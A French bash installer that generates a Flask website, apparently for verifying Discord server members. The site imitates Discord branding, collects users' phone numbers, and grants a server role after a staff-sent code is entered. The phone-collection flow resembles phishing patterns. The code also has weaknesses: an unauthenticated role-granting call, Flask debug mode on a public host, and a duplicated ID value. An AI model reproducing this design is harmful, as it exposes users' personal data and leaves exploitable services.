#!/bin/bash

# Script d'installation de la partie site web
# À exécuter APRÈS setup_bot.sh

echo "╔════════════════════════════════════════════════════════════╗"
echo "║     🌐 INSTALLATION DU SITE WEB (PARTIE SITE SEULE)       ║"
echo "╚════════════════════════════════════════════════════════════╝"
echo ""

# Couleurs
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

print_step()  { echo -e "${BLUE}[ÉTAPE]${NC} $1"; }
print_success() { echo -e "${GREEN}[SUCCÈS]${NC} $1"; }
print_warning() { echo -e "${YELLOW}[ATTENTION]${NC} $1"; }
print_error()   { echo -e "${RED}[ERREUR]${NC} $1"; }

# Sauvegarde des fichiers qui vont être modifiés
print_step "Sauvegarde des fichiers existants (requirements.txt, config.example.py, render.yaml)..."
BACKUP_DIR="backup_web_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$BACKUP_DIR"
cp requirements.txt config.example.py render.yaml "$BACKUP_DIR" 2>/dev/null || true
print_success "Sauvegarde effectuée dans $BACKUP_DIR"

# 1. Ajout des dépendances web à requirements.txt
print_step "Mise à jour de requirements.txt (ajout Flask, gunicorn)..."
cat >> requirements.txt << 'EOF'

# Web
flask==3.0.0
gunicorn==21.2.0
python-dotenv==1.0.0
EOF
print_success "requirements.txt mis à jour"

# 2. Création de la structure web
print_step "Création des dossiers web..."
mkdir -p web/templates web/static
print_success "Dossiers web créés"

# 3. Création de web/__init__.py
cat > web/__init__.py << 'EOF'
# Package du site web
EOF
print_success "web/__init__.py créé"

# 4. Création de web/app.py (application Flask)
print_step "Création de web/app.py..."
cat > web/app.py << 'EOF'
"""
Application Flask pour le site de vérification
"""
from flask import Flask, render_template, request, jsonify
import sqlite3
import requests
from datetime import datetime
import os
import sys
from pathlib import Path

# Ajouter le chemin parent pour les imports
sys.path.append(str(Path(__file__).parent.parent))

try:
    from config import SITE_URL, SECRET_KEY, DATABASE_URL, BOT_API_URL
    from database import get_db
except ImportError:
    # Mode production avec variables d'env
    SITE_URL = os.getenv('SITE_URL', 'http://localhost:5000')
    SECRET_KEY = os.getenv('SECRET_KEY', 'dev-key-change-me')
    DATABASE_URL = os.getenv('DATABASE_URL', 'sqlite:///verif.db')
    BOT_API_URL = os.getenv('BOT_API_URL', 'http://localhost:5001')
    
    def get_db():
        db_path = DATABASE_URL.replace('sqlite:///', '')
        return sqlite3.connect(db_path)

app = Flask(__name__)
app.secret_key = SECRET_KEY
app.config['SESSION_TYPE'] = 'filesystem'

@app.route('/')
def index():
    return render_template('index.html', site_url=SITE_URL)

@app.route('/verify/<token>')
def verify_page(token):
    with get_db() as conn:
        cur = conn.execute(
            "SELECT user_id, expires_at FROM verifications WHERE token = ? AND phone IS NULL",
            (token,)
        )
        row = cur.fetchone()
    
    if not row:
        return render_template('error.html', message="Lien invalide ou déjà utilisé")
    
    expires = datetime.fromisoformat(row[1])
    if datetime.utcnow() > expires:
        return render_template('error.html', message="Ce lien a expiré")
    
    return render_template('verify.html', token=token)

@app.route('/submit-phone', methods=['POST'])
def submit_phone():
    token = request.form.get('token')
    phone = request.form.get('phone')
    
    if not token or not phone:
        return render_template('error.html', message="Données manquantes")
    
    with get_db() as conn:
        cur = conn.execute(
            "SELECT user_id FROM verifications WHERE token = ? AND phone IS NULL",
            (token,)
        )
        row = cur.fetchone()
        
        if not row:
            return render_template('error.html', message="Token invalide")
        
        user_id = row[0]
        
        conn.execute(
            "UPDATE verifications SET phone = ? WHERE token = ?",
            (phone, token)
        )
    
    # Notifier le bot via son API
    try:
        requests.post(
            f'{BOT_API_URL}/phone_submitted',
            json={'token': token, 'phone': phone, 'user_id': user_id},
            timeout=5
        )
    except Exception as e:
        app.logger.error(f"Erreur notification bot: {e}")
    
    return render_template('submitted.html', token=token)

@app.route('/enter/<token>')
def enter_code_page(token):
    with get_db() as conn:
        cur = conn.execute(
            "SELECT code FROM verifications WHERE token = ? AND code IS NOT NULL",
            (token,)
        )
        row = cur.fetchone()
    
    if not row:
        return render_template('waiting.html', token=token)
    
    return render_template('enter_code.html', token=token)

@app.route('/submit-code', methods=['POST'])
def submit_code():
    token = request.form.get('token')
    code = request.form.get('code')
    
    if not token or not code:
        return render_template('error.html', message="Données manquantes")
    
    with get_db() as conn:
        cur = conn.execute(
            "SELECT user_id, code FROM verifications WHERE token = ?",
            (token,)
        )
        row = cur.fetchone()
        
        if not row:
            return render_template('error.html', message="Token invalide")
        
        user_id, expected_code = row
        
        if expected_code != code:
            return render_template('error.html', message="Code incorrect")
        
        conn.execute("DELETE FROM verifications WHERE token = ?", (token,))
    
    # Demander au bot d'attribuer le rôle
    try:
        requests.post(
            f'{BOT_API_URL}/grant_role',
            json={'user_id': user_id},
            timeout=5
        )
    except Exception as e:
        app.logger.error(f"Erreur attribution rôle: {e}")
    
    return render_template('success.html')

@app.route('/health')
def health():
    return jsonify({"status": "healthy", "timestamp": datetime.utcnow().isoformat()})

if __name__ == '__main__':
    port = int(os.getenv('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=True)
EOF
print_success "web/app.py créé"

# 5. Création des templates HTML
print_step "Création des templates HTML..."

# index.html
cat > web/templates/index.html << 'EOF'
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vérification Discord</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            max-width: 500px;
            width: 100%;
            background: white;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
            animation: slideUp 0.5s ease;
        }
        @keyframes slideUp {
            from { opacity: 0; transform: translateY(30px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .header {
            background: #5865F2;
            color: white;
            padding: 40px 30px;
            text-align: center;
        }
        .discord-logo {
            width: 80px;
            height: 80px;
            background: white;
            border-radius: 50%;
            margin: 0 auto 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 40px;
        }
        .content { padding: 40px 30px; }
        .feature {
            display: flex;
            align-items: center;
            margin-bottom: 25px;
            padding: 15px;
            background: #f8f9fa;
            border-radius: 12px;
            transition: transform 0.2s;
        }
        .feature:hover { transform: translateX(5px); }
        .feature-icon {
            width: 50px;
            height: 50px;
            background: #5865F2;
            border-radius: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-size: 24px;
            margin-right: 15px;
        }
        .feature-text h3 { font-size: 18px; margin-bottom: 5px; color: #333; }
        .feature-text p { color: #666; font-size: 14px; }
        .btn {
            display: block;
            width: 100%;
            padding: 16px;
            background: #5865F2;
            color: white;
            text-align: center;
            text-decoration: none;
            border-radius: 12px;
            font-weight: bold;
            font-size: 18px;
            transition: background 0.3s;
            border: none;
            cursor: pointer;
        }
        .btn:hover { background: #4752C4; }
        .footer {
            text-align: center;
            padding: 20px;
            color: #999;
            font-size: 14px;
            border-top: 1px solid #eee;
        }
        .status {
            display: inline-block;
            padding: 6px 12px;
            background: #e8f5e9;
            color: #2e7d32;
            border-radius: 20px;
            font-size: 14px;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="discord-logo">
                <img src="https://cdn.prod.website-files.com/6257adef93867e50d84d30e2/636e0a6a49cf127bf92de1e2_icon_clyde_blurple_RGB.png" alt="Discord" style="width: 50px;">
            </div>
            <h1>Vérification Discord</h1>
            <p>Système sécurisé de vérification par téléphone</p>
        </div>
        
        <div class="content">
            <div class="feature">
                <div class="feature-icon">🔐</div>
                <div class="feature-text">
                    <h3>Sécurisé</h3>
                    <p>Vérification en 2 étapes</p>
                </div>
            </div>
            <div class="feature">
                <div class="feature-icon">⚡</div>
                <div class="feature-text">
                    <h3>Rapide</h3>
                    <p>Moins de 2 minutes</p>
                </div>
            </div>
            <div class="feature">
                <div class="feature-icon">🔒</div>
                <div class="feature-text">
                    <h3>Confidentiel</h3>
                    <p>Numéro supprimé après vérification</p>
                </div>
            </div>
            
            <div style="text-align: center; margin: 30px 0;">
                <span class="status">✅ Système opérationnel</span>
            </div>
            
            <a href="https://discord.com" class="btn" target="_blank">
                Ouvrir Discord
            </a>
        </div>
        
        <div class="footer">
            &copy; 2026 - Système de vérification Discord
        </div>
    </div>
</body>
</html>
EOF

# verify.html
cat > web/templates/verify.html << 'EOF'
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Entrez votre numéro</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            max-width: 450px;
            width: 100%;
            background: white;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            padding: 40px;
            animation: slideUp 0.5s ease;
        }
        @keyframes slideUp {
            from { opacity: 0; transform: translateY(30px); }
            to { opacity: 1; transform: translateY(0); }
        }
        h1 {
            color: #333;
            margin-bottom: 10px;
            font-size: 28px;
        }
        p {
            color: #666;
            margin-bottom: 30px;
        }
        label {
            display: block;
            margin-bottom: 8px;
            color: #555;
            font-weight: 500;
        }
        input {
            width: 100%;
            padding: 15px;
            border: 2px solid #e0e0e0;
            border-radius: 12px;
            font-size: 16px;
            margin-bottom: 20px;
            transition: border 0.3s;
        }
        input:focus {
            border-color: #5865F2;
            outline: none;
        }
        button {
            width: 100%;
            padding: 15px;
            background: #5865F2;
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            transition: background 0.3s;
        }
        button:hover {
            background: #4752C4;
        }
        .info {
            margin-top: 20px;
            text-align: center;
            color: #999;
            font-size: 14px;
        }
        .back-link {
            display: block;
            text-align: center;
            margin-top: 20px;
            color: #5865F2;
            text-decoration: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>📱 Vérification</h1>
        <p>Entrez votre numéro de téléphone pour commencer</p>
        
        <form method="post" action="/submit-phone">
            <input type="hidden" name="token" value="{{ token }}">
            <label for="phone">Numéro de téléphone</label>
            <input type="tel" id="phone" name="phone" placeholder="+33612345678" required>
            <button type="submit">Envoyer</button>
        </form>
        
        <div class="info">
            Un staff vous contactera avec un code secret.
        </div>
        
        <a href="/" class="back-link">← Retour à l'accueil</a>
    </div>
</body>
</html>
EOF

# submitted.html
cat > web/templates/submitted.html << 'EOF'
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Numéro envoyé</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            max-width: 450px;
            width: 100%;
            background: white;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            padding: 40px;
            text-align: center;
            animation: slideUp 0.5s ease;
        }
        @keyframes slideUp {
            from { opacity: 0; transform: translateY(30px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .success-icon {
            font-size: 80px;
            margin-bottom: 20px;
        }
        h1 {
            color: #333;
            margin-bottom: 15px;
        }
        p {
            color: #666;
            margin-bottom: 30px;
            line-height: 1.6;
        }
        .btn {
            display: inline-block;
            padding: 15px 30px;
            background: #5865F2;
            color: white;
            text-decoration: none;
            border-radius: 12px;
            font-weight: bold;
            transition: background 0.3s;
            margin: 10px;
        }
        .btn:hover {
            background: #4752C4;
        }
        .btn-secondary {
            background: #6c757d;
        }
        .btn-secondary:hover {
            background: #5a6268;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="success-icon">✅</div>
        <h1>Numéro envoyé !</h1>
        <p>Votre numéro a bien été transmis au staff.<br>Vous recevrez bientôt un code secret par message privé Discord.</p>
        
        <a href="/enter/{{ token }}" class="btn">J'ai reçu un code</a>
        <a href="/" class="btn btn-secondary">Retour à l'accueil</a>
    </div>
</body>
</html>
EOF

# enter_code.html
cat > web/templates/enter_code.html << 'EOF'
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Entrer le code</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            max-width: 450px;
            width: 100%;
            background: white;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            padding: 40px;
            animation: slideUp 0.5s ease;
        }
        @keyframes slideUp {
            from { opacity: 0; transform: translateY(30px); }
            to { opacity: 1; transform: translateY(0); }
        }
        h1 {
            color: #333;
            margin-bottom: 10px;
            font-size: 28px;
        }
        p {
            color: #666;
            margin-bottom: 30px;
        }
        label {
            display: block;
            margin-bottom: 8px;
            color: #555;
            font-weight: 500;
        }
        input {
            width: 100%;
            padding: 15px;
            border: 2px solid #e0e0e0;
            border-radius: 12px;
            font-size: 16px;
            margin-bottom: 20px;
            transition: border 0.3s;
            text-align: center;
            letter-spacing: 2px;
        }
        input:focus {
            border-color: #5865F2;
            outline: none;
        }
        button {
            width: 100%;
            padding: 15px;
            background: #5865F2;
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            transition: background 0.3s;
        }
        button:hover {
            background: #4752C4;
        }
        .info {
            margin-top: 20px;
            text-align: center;
            color: #999;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔑 Code secret</h1>
        <p>Entrez le code que vous avez reçu sur Discord</p>
        
        <form method="post" action="/submit-code">
            <input type="hidden" name="token" value="{{ token }}">
            <label for="code">Code à 6 chiffres</label>
            <input type="text" id="code" name="code" placeholder="123456" maxlength="6" pattern="[0-9]{6}" required>
            <button type="submit">Vérifier</button>
        </form>
        
        <div class="info">
            Si vous n'avez pas reçu de code, contactez un staff.
        </div>
    </div>
</body>
</html>
EOF

# waiting.html
cat > web/templates/waiting.html << 'EOF'
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>En attente du code</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            max-width: 450px;
            width: 100%;
            background: white;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            padding: 40px;
            text-align: center;
            animation: slideUp 0.5s ease;
        }
        @keyframes slideUp {
            from { opacity: 0; transform: translateY(30px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .loader {
            border: 5px solid #f3f3f3;
            border-top: 5px solid #5865F2;
            border-radius: 50%;
            width: 60px;
            height: 60px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        h1 {
            color: #333;
            margin-bottom: 15px;
        }
        p {
            color: #666;
            margin-bottom: 30px;
            line-height: 1.6;
        }
        .btn {
            display: inline-block;
            padding: 15px 30px;
            background: #5865F2;
            color: white;
            text-decoration: none;
            border-radius: 12px;
            font-weight: bold;
            transition: background 0.3s;
            margin: 10px;
        }
        .btn:hover {
            background: #4752C4;
        }
        .btn-secondary {
            background: #6c757d;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="loader"></div>
        <h1>⏳ En attente du code</h1>
        <p>Un staff prépare votre code secret.<br>Cette page se mettra à jour automatiquement quand le code sera prêt.</p>
        
        <a href="/enter/{{ token }}" class="btn">🔄 Actualiser</a>
        <a href="/" class="btn btn-secondary">Retour à l'accueil</a>
        
        <meta http-equiv="refresh" content="5">
    </div>
</body>
</html>
EOF

# success.html
cat > web/templates/success.html << 'EOF'
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vérification réussie</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            max-width: 450px;
            width: 100%;
            background: white;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            padding: 40px;
            text-align: center;
            animation: slideUp 0.5s ease;
        }
        @keyframes slideUp {
            from { opacity: 0; transform: translateY(30px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .success-icon {
            font-size: 80px;
            margin-bottom: 20px;
        }
        h1 {
            color: #333;
            margin-bottom: 15px;
        }
        p {
            color: #666;
            margin-bottom: 30px;
            line-height: 1.6;
        }
        .btn {
            display: inline-block;
            padding: 15px 30px;
            background: #5865F2;
            color: white;
            text-decoration: none;
            border-radius: 12px;
            font-weight: bold;
            transition: background 0.3s;
        }
        .btn:hover {
            background: #4752C4;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="success-icon">🎉</div>
        <h1>Vérification réussie !</h1>
        <p>Félicitations, votre compte a été vérifié avec succès.<br>Vous avez maintenant accès à tous les salons du serveur Discord.</p>
        
        <a href="https://discord.com" class="btn" target="_blank">Ouvrir Discord</a>
    </div>
</body>
</html>
EOF

# error.html
cat > web/templates/error.html << 'EOF'
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Erreur</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            max-width: 450px;
            width: 100%;
            background: white;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            padding: 40px;
            text-align: center;
            animation: slideUp 0.5s ease;
        }
        @keyframes slideUp {
            from { opacity: 0; transform: translateY(30px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .error-icon {
            font-size: 80px;
            margin-bottom: 20px;
        }
        h1 {
            color: #333;
            margin-bottom: 15px;
        }
        .message {
            background: #f8d7da;
            color: #721c24;
            padding: 15px;
            border-radius: 10px;
            margin-bottom: 30px;
        }
        .btn {
            display: inline-block;
            padding: 15px 30px;
            background: #5865F2;
            color: white;
            text-decoration: none;
            border-radius: 12px;
            font-weight: bold;
            transition: background 0.3s;
        }
        .btn:hover {
            background: #4752C4;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="error-icon">❌</div>
        <h1>Une erreur est survenue</h1>
        <div class="message">
            {{ message }}
        </div>
        <a href="/" class="btn">Retour à l'accueil</a>
    </div>
</body>
</html>
EOF

print_success "Tous les templates HTML créés"

# 6. Mise à jour de config.example.py (ajout de BOT_API_URL)
print_step "Mise à jour de config.example.py (ajout BOT_API_URL)..."
cat >> config.example.py << 'EOF'

# URL de l'API du bot (pour la communication site <-> bot)
BOT_API_URL = os.getenv("BOT_API_URL", "http://localhost:5001")
EOF
print_success "config.example.py mis à jour"

# 7. Mise à jour de render.yaml pour inclure le service web du site et la BDD PostgreSQL
print_step "Mise à jour de render.yaml (services web + base de données)..."
cat > render.yaml << 'EOF'
services:
  # Service Web (Site)
  - type: web
    name: verification-site
    runtime: python
    buildCommand: pip install -r requirements.txt
    startCommand: cd web && gunicorn app:app
    envVars:
      - key: BOT_API_URL
        value: https://verification-bot.onrender.com
      - key: SITE_URL
        value: https://verification-site.onrender.com
      - key: SECRET_KEY
        generateValue: true
      - key: DATABASE_URL
        fromDatabase:
          name: verification-db
          property: connectionString
      - key: BOT_TOKEN
        sync: false
      - key: GUILD_ID
        value: 1473260729166467186
      - key: ROLE_ID
        value: 1473260729166467186
      - key: VERIFY_CHANNEL_ID
        sync: false
      - key: STAFF_CHANNEL_ID
        sync: false

  # Service Worker (Bot) - on le met aussi en web service pour avoir une URL
  - type: web
    name: verification-bot
    runtime: python
    buildCommand: pip install -r requirements.txt
    startCommand: cd bot && python main.py
    envVars:
      - key: BOT_API_URL
        value: https://verification-bot.onrender.com
      - key: SITE_URL
        value: https://verification-site.onrender.com
      - key: DATABASE_URL
        fromDatabase:
          name: verification-db
          property: connectionString
      - key: BOT_TOKEN
        sync: false
      - key: GUILD_ID
        value: 1473260729166467186
      - key: ROLE_ID
        value: 1473260729166467186
      - key: VERIFY_CHANNEL_ID
        sync: false
      - key: STAFF_CHANNEL_ID
        sync: false

  # Base de données PostgreSQL
  - type: database
    name: verification-db
    databaseName: verification
    plan: free
EOF
print_success "render.yaml mis à jour (avec deux services web et une BDD)"

# 8. Adaptation du bot pour qu'il écoute sur 0.0.0.0 et utilise le port de Render
print_step "Adaptation du bot pour Render (port HTTP dynamique)..."
# On va modifier bot/utils.py pour utiliser le port via variable d'env
sed -i 's/5001/int(os.getenv("PORT", 5001))/g' bot/utils.py
# Et remplacer 'localhost' par '0.0.0.0'
sed -i "s/'localhost'/'0.0.0.0'/g" bot/utils.py
# Ajouter l'import os en haut si nécessaire (déjà présent normalement)
print_success "bot/utils.py modifié pour Render"

# 9. Message final
echo ""
echo "╔════════════════════════════════════════════════════════════╗"
echo "║     ✅ INSTALLATION DU SITE WEB TERMINÉE AVEC SUCCÈS !    ║"
echo "╚════════════════════════════════════════════════════════════╝"
echo ""
echo "📁 Structure web créée :"
echo "   - web/app.py"
echo "   - web/templates/*.html"
echo ""
echo "📝 Fichiers modifiés :"
echo "   - requirements.txt (ajout Flask, gunicorn)"
echo "   - config.example.py (ajout BOT_API_URL)"
echo "   - render.yaml (configuration complète pour Render)"
echo "   - bot/utils.py (adaptation pour Render)"
echo ""
echo "🚀 Prochaines étapes pour déployer sur Render :"
echo "   1. Copier config.example.py vers config.py et éditer si nécessaire (ou utiliser variables d'env)"
echo "   2. (Optionnel) Tester en local :"
echo "      - Dans un terminal : python bot/main.py"
echo "      - Dans un autre : cd web && python app.py"
echo "   3. Pousser le code sur GitHub :"
echo "      git add ."
echo "      git commit -m \"Ajout site web + configuration Render\""
echo "      git push"
echo "   4. Aller sur Render.com, cliquer sur 'New Blueprint' et connecter le dépôt."
echo "   5. Renseigner les variables d'environnement secrètes (BOT_TOKEN, VERIFY_CHANNEL_ID, STAFF_CHANNEL_ID) dans l'interface Render."
echo "   6. Lancer le déploiement."
echo ""
echo "🔒 Rappel : Ne jamais commiter config.py ou .env !"
echo ""